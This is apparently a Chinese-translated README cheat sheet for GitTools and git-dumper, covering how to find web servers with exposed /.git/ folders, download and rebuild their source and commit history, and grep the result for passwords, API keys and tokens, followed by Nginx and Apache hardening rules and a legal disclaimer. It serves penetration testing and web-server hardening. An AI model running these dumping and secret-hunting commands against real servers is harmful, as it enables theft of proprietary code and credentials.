<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📂 GitTools - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
   ██████╗ ██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔════╝ ██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██║  ███╗██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██║   ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ╚██████╔╝██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚═════╝ ╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
      Exposed /.git/ Repository Dumping, Extraction & Secret Hunting
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/GitTools-Git_Dumping-blue?style=for-the-badge" alt="GitTools">
  <img src="https://img.shields.io/badge/Author-Internetwache-orange?style=for-the-badge" alt="internetwache">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_Secrets-green?style=for-the-badge" alt="网络安全">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p对齐=“中心”>
  <b>📂 用于发现 Web 服务器上暴露的 <code>/.git/</code> 文件夹、下载原始 Git 对象存储以及完全重建原始源代码和提交历史记录的基本工具包</b>
</p>

---

## 📋 目录

- [概述和暴露的 .git 危险](#-overview--the-exposed-git-hazard)
- [安装](#-安装)
- [三个 GitTools 模块](#-the- Three-gittools-modules)
  - [1.转储器 (`gitdumper.sh`)](#1-dumper-gitdumpersh)
  - [2.提取器 (`extractor.sh`)](#2-extractor-extractorsh)
  - [3.查找器 (`finder.py`)](#3-finder-finderpy)
- [替代 Python 转储器：`git-dumper`](#-alternative-python-dumper-git-dumper)
- [重建后秘密和凭证狩猎](#-post-reconstruction-secret--credential-hunting)
- [快速参考表](#-quick-reference-table)
- [防御注意事项和 Web 服务器强化](#-defective-considerations--web-server-hardening)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和暴露的 .git 危害

当开发人员通过 `git clone` 或自动化脚本部署 Web 应用程序而没有正确限制对隐藏目录的访问时，**`/.git/`** 文件夹可以通过 HTTP/HTTPS 进行访问：
`https://target.com/.git/`

即使目录列表（索引）被禁用，Git 的确定性结构也允许攻击者下载 `/.git/HEAD`、`/.git/config`、`/.git/index`，并遍历所有 Git 松散对象 (`.git/objects/xx/xxxx...`)。这使得能够完全重建：
- 完整的应用程序源代码和内部 API。
- 配置文件中的数据库凭据、API 令牌和 SSH 私钥。
- 完整的 git 提交日志、作者电子邮件和开发分支。

---

## 📥 安装
```bash
# Clone GitTools repository
git clone https://github.com/internetwache/GitTools.git
cd GitTools
chmod +x Dumper/gitdumper.sh Extractor/extractor.sh

# Install alternative standalone Python git-dumper via pip
pip install git-dumper
```
---

## 🚀 三个 GitTools 模块

GitTools 分为三个专门的实用程序：

### 1.自卸车(`gitdumper.sh`)
从 Web 服务器下载尽可能多的 `.git` 目录：
```bash
# Syntax: ./gitdumper.sh <URL_TO_GIT> <LOCAL_DESTINATION>
./Dumper/gitdumper.sh https://target.com/.git/ /tmp/target_repo/
```
### 2.提取器(`extractor.sh`)
从转储的 `.git` 松散对象重建原始文件、提交树和分支：
```bash
# Syntax: ./extractor.sh <DUMPED_DIR> <OUTPUT_CODE_DIR>
./Extractor/extractor.sh /tmp/target_repo/ /tmp/extracted_source/
```
在 `/tmp/extracted_source/` 内部，每次提交都会恢复到一个独立的目录中，其中包含当时的完整文件树。

### 3. 查找器 (`finder.py`)
扫描域或 CIDR 块列表以检测暴露的 `.git` 目录：
```bash
python3 Finder/finder.py -i targets.txt -u "Mozilla/5.0"
```
---

## 🐍 替代 Python 转储器：`git-dumper`

`git-dumper` 是一种多线程 Python 替代方案，可以一步自动重建实时、工作的 git 存储库：
```bash
# Dump and reconstruct working repository in one command
git-dumper https://target.com/.git/ ./recovered_repo/

# Run through HTTP/SOCKS proxy
git-dumper --proxy http://127.0.0.1:8080 https://target.com/.git/ ./recovered_repo/
```
完成后，您可以在文件夹内使用普通的 `git` 命令：
```bash
cd ./recovered_repo/
git log -p              # Review all commit diffs and historical edits
git status              # Check untracked files
git branch -a           # List all remote and local branches
```
---

## 🔍 Post-Reconstruction Secret & Credential Hunting

Once the repository is recovered, search for credentials and hidden files:
```bash
cd ./recovered_repo/

# Search for database strings and API keys
grep -Erio "password|secret|api_key|token|AWS" .

# Scan the reconstructed repo with Gitleaks / TruffleHog
gitleaks detect -v
trufflehog git file://$(pwd)
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **使用 git-dumper 转储 (Python)**| `git-dumper https://target.com/.git/ ./repo/` |
| **使用 GitTools Bash 转储** | `./Dumper/gitdumper.sh https://target.com/.git/ ./dump/` |
| **提取对源代码的提交** | `./Extractor/extractor.sh ./dump/ ./source/` |
| **扫描主机列表中的 .git** | `python3 Finder/finder.py -i domains.txt` |
| **查看提交历史记录** | `git log -p --color` |
| **寻找硬编码的秘密** | `gitleaks detect -v` |

---

## 🛡️ 防御考虑和 Web 服务器强化

1. **Nginx 强化：**
   ```nginx
   location ~ /\.git {
       deny all;
       return 404;
   }
   ```
2. **Apache 强化 (`.htaccess`):**
   ```apache
   RedirectMatch 404 /\.git
   ```
3. **CI/CD 最佳实践：** 切勿通过将 git 直接克隆到 Web 根目录 (`/var/www/html/`) 来部署代码。使用干净的工件包或 Docker 容器。

---

## ⚠️ 法律免责声明

> [!警告]
> GitTools 和 git-dumper 专为授权漏洞评估和防御基础设施审核而设计。未经许可从未经授权的网络应用程序下载专有源代码是非法的。